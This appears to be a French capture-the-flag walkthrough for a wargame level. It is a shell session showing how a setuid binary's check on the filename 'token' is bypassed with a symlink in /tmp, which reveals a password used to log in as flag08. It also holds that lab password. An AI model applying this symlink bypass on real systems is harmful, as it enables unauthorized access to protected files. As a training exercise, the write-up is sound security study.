$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token

on trouve un binaire et un fichier token

$ ./level08
./level08 [file to read]

$ ./level08 level08
affiche le contenu du binaire

$ ./level08 token
You may not access 'token'

ca marche pas pour token

$ ./level08 .profile
level08: Unable to open .profile: Permission denied
Pas la meme erreur avec un fichier dont on a effectivement pas les droits

On dirait que le blocage est du a une verification propre a l'executable:
$ ./level08 bonjour
level08: Unable to open bonjour: No such file or directory
$ ./level08 'bonjour token'
You may not access 'bonjour token

il semblerait qu il y ait une verification de la presence du mot token dans le nom du fichier, nous allons donc rediriger le fichier vers un autre grace a un lien symbolique car on a pas les droits pour cp ou mv:
$ ln -s /home/user/level08/token /tmp/flag
$ ./level08 /tmp/flag
quif5eloekouj29ke0vouxean

$ su flag08
password: quif5eloekouj29ke0vouxean

$ su level09
Password: 
su: Authentication failure
$ su flag08
Password: 
Don't forget to launch getflag !
$ getflag
Check flag.Here is your token :